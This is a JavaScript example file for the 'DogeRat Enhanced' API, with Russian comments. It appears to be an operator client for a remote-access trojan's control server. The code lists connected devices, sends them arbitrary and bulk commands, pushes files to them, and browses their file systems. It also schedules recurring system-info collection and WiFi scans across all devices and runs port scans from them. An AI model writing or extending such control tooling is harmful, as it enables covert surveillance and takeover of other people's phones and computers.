// Примеры использования API DogeRat Enhanced

const axios = require('axios');

// Базовый URL сервера (измените на ваш)
const BASE_URL = 'http://localhost:3000';

class DogeRatAPI {
    constructor(baseUrl = BASE_URL) {
        this.baseUrl = baseUrl;
        this.axios = axios.create({
            baseURL: baseUrl,
            timeout: 10000,
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }

    // Получение списка устройств
    async getDevices() {
        try {
            const response = await this.axios.get('/api/devices');
            return response.data;
        } catch (error) {
            console.error('Ошибка получения списка устройств:', error.message);
            return null;
        }
    }

    // Отправка команды устройству
    async sendCommand(deviceId, command, params = {}) {
        try {
            const response = await this.axios.post('/api/command', {
                deviceId,
                command,
                params
            });
            return response.data;
        } catch (error) {
            console.error('Ошибка отправки команды:', error.message);
            return null;
        }
    }

    // Получение статистики
    async getStatistics() {
        try {
            const response = await this.axios.get('/api/statistics');
            return response.data;
        } catch (error) {
            console.error('Ошибка получения статистики:', error.message);
            return null;
        }
    }

    // Получение истории команд
    async getCommandHistory(limit = 50) {
        try {
            const response = await this.axios.get(`/api/commands?limit=${limit}`);
            return response.data;
        } catch (error) {
            console.error('Ошибка получения истории команд:', error.message);
            return null;
        }
    }

    // Получение событий безопасности
    async getSecurityEvents(limit = 20) {
        try {
            const response = await this.axios.get(`/api/security?limit=${limit}`);
            return response.data;
        } catch (error) {
            console.error('Ошибка получения событий безопасности:', error.message);
            return null;
        }
    }

    // Создание задачи в планировщике
    async createScheduledTask(name, command, schedule, deviceId = 'all') {
        try {
            const response = await this.axios.post('/api/scheduler/tasks', {
                name,
                command,
                schedule,
                deviceId
            });
            return response.data;
        } catch (error) {
            console.error('Ошибка создания задачи:', error.message);
            return null;
        }
    }

    // Получение списка задач
    async getScheduledTasks() {
        try {
            const response = await this.axios.get('/api/scheduler/tasks');
            return response.data;
        } catch (error) {
            console.error('Ошибка получения задач:', error.message);
            return null;
        }
    }

    // Загрузка файла
    async uploadFile(filePath, deviceId) {
        try {
            const FormData = require('form-data');
            const fs = require('fs');
            
            const form = new FormData();
            form.append('file', fs.createReadStream(filePath));
            form.append('deviceId', deviceId);
            
            const response = await this.axios.post('/api/files/upload', form, {
                headers: form.getHeaders()
            });
            return response.data;
        } catch (error) {
            console.error('Ошибка загрузки файла:', error.message);
            return null;
        }
    }

    // Получение списка файлов
    async getFileList(deviceId, path = '/') {
        try {
            const response = await this.axios.get('/api/files/list', {
                params: { deviceId, path }
            });
            return response.data;
        } catch (error) {
            console.error('Ошибка получения списка файлов:', error.message);
            return null;
        }
    }

    // Выполнение сетевого теста
    async performNetworkTest(deviceId, testType, target) {
        try {
            const response = await this.axios.post('/api/network/test', {
                deviceId,
                testType, // 'ping', 'traceroute', 'portscan'
                target
            });
            return response.data;
        } catch (error) {
            console.error('Ошибка сетевого теста:', error.message);
            return null;
        }
    }
}

// Примеры использования
async function examples() {
    const api = new DogeRatAPI();

    console.log('🚀 Примеры использования DogeRat Enhanced API\n');

    // 1. Получение списка устройств
    console.log('📱 Получение списка устройств...');
    const devices = await api.getDevices();
    if (devices) {
        console.log(`Найдено устройств: ${devices.length}`);
        devices.forEach(device => {
            console.log(`  - ${device.id} (${device.model}) - ${device.status}`);
        });
    }
    console.log('');

    // 2. Отправка команды
    console.log('📤 Отправка команды получения системной информации...');
    const commandResult = await api.sendCommand('device_001', 'get_system_info');
    if (commandResult) {
        console.log('Команда отправлена успешно');
    }
    console.log('');

    // 3. Получение статистики
    console.log('📊 Получение статистики...');
    const stats = await api.getStatistics();
    if (stats) {
        console.log(`Всего устройств: ${stats.totalDevices}`);
        console.log(`Онлайн устройств: ${stats.onlineDevices}`);
        console.log(`Команд сегодня: ${stats.commandsToday}`);
    }
    console.log('');

    // 4. Создание задачи
    console.log('⏰ Создание задачи в планировщике...');
    const task = await api.createScheduledTask(
        'Проверка батареи',
        'get_battery_status',
        30, // каждые 30 минут
        'all'
    );
    if (task) {
        console.log(`Задача создана: ${task.name} (ID: ${task.id})`);
    }
    console.log('');

    // 5. Получение истории команд
    console.log('📝 Получение истории команд...');
    const history = await api.getCommandHistory(10);
    if (history) {
        console.log(`Последние ${history.length} команд:`);
        history.forEach(cmd => {
            console.log(`  - ${cmd.command} -> ${cmd.deviceId} (${new Date(cmd.timestamp).toLocaleString()})`);
        });
    }
    console.log('');

    // 6. Сетевой тест
    console.log('🌐 Выполнение ping теста...');
    const networkTest = await api.performNetworkTest('device_001', 'ping', '8.8.8.8');
    if (networkTest) {
        console.log('Ping тест запущен');
    }
    console.log('');

    // 7. Получение событий безопасности
    console.log('🔒 Получение событий безопасности...');
    const securityEvents = await api.getSecurityEvents(5);
    if (securityEvents) {
        console.log(`Последние ${securityEvents.length} событий:`);
        securityEvents.forEach(event => {
            console.log(`  - ${event.event}: ${event.details} (${event.severity})`);
        });
    }
}

// Пример интеграции с веб-хуками
class WebhookHandler {
    constructor(api) {
        this.api = api;
    }

    // Обработчик события подключения устройства
    async onDeviceConnected(deviceId) {
        console.log(`🟢 Устройство подключено: ${deviceId}`);
        
        // Автоматически запрашиваем системную информацию
        await this.api.sendCommand(deviceId, 'get_system_info');
        
        // Создаем задачу мониторинга батареи
        await this.api.createScheduledTask(
            `Мониторинг батареи ${deviceId}`,
            'get_battery_status',
            60,
            deviceId
        );
    }

    // Обработчик события отключения устройства
    async onDeviceDisconnected(deviceId) {
        console.log(`🔴 Устройство отключено: ${deviceId}`);
        
        // Можно добавить логику очистки или уведомлений
    }

    // Обработчик критических событий безопасности
    async onSecurityAlert(event) {
        console.log(`🚨 Критическое событие безопасности: ${event.event}`);
        
        // Можно добавить автоматические действия
        if (event.severity === 'critical') {
            // Например, заблокировать подозрительный IP
            console.log('Принятие защитных мер...');
        }
    }
}

// Пример мониторинга в реальном времени
class RealTimeMonitor {
    constructor(api) {
        this.api = api;
        this.isRunning = false;
    }

    start() {
        this.isRunning = true;
        this.monitorLoop();
    }

    stop() {
        this.isRunning = false;
    }

    async monitorLoop() {
        while (this.isRunning) {
            try {
                // Проверяем статус устройств каждые 30 секунд
                const devices = await this.api.getDevices();
                if (devices) {
                    const onlineCount = devices.filter(d => d.status === 'online').length;
                    console.log(`📊 Мониторинг: ${onlineCount}/${devices.length} устройств онлайн`);
                }

                // Проверяем новые события безопасности
                const securityEvents = await this.api.getSecurityEvents(1);
                if (securityEvents && securityEvents.length > 0) {
                    const latestEvent = securityEvents[0];
                    if (latestEvent.severity === 'critical' || latestEvent.severity === 'warning') {
                        console.log(`⚠️ Новое событие: ${latestEvent.event}`);
                    }
                }

                // Ждем 30 секунд
                await new Promise(resolve => setTimeout(resolve, 30000));
            } catch (error) {
                console.error('Ошибка мониторинга:', error.message);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }
}

// Пример автоматизации задач
class TaskAutomation {
    constructor(api) {
        this.api = api;
    }

    // Создание набора стандартных задач мониторинга
    async setupMonitoringTasks() {
        const tasks = [
            {
                name: 'Ежечасная проверка системы',
                command: 'get_system_info',
                schedule: 60
            },
            {
                name: 'Проверка батареи каждые 30 минут',
                command: 'get_battery_status',
                schedule: 30
            },
            {
                name: 'Сканирование WiFi каждые 2 часа',
                command: 'wifi_scan',
                schedule: 120
            },
            {
                name: 'Проверка сетевого подключения',
                command: 'ping:8.8.8.8',
                schedule: 15
            }
        ];

        console.log('⚙️ Настройка задач мониторинга...');
        for (const taskData of tasks) {
            const task = await this.api.createScheduledTask(
                taskData.name,
                taskData.command,
                taskData.schedule,
                'all'
            );
            if (task) {
                console.log(`✅ Создана задача: ${task.name}`);
            }
        }
    }

    // Массовая отправка команд
    async sendBulkCommands(commands) {
        console.log(`📤 Отправка ${commands.length} команд...`);
        
        const results = [];
        for (const cmd of commands) {
            const result = await this.api.sendCommand(cmd.deviceId, cmd.command, cmd.params);
            results.push({ command: cmd, result });
            
            // Небольшая задержка между командами
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        return results;
    }
}

// Экспорт для использования в других модулях
module.exports = {
    DogeRatAPI,
    WebhookHandler,
    RealTimeMonitor,
    TaskAutomation
};

// Запуск примеров, если файл запущен напрямую
if (require.main === module) {
    examples().catch(console.error);
}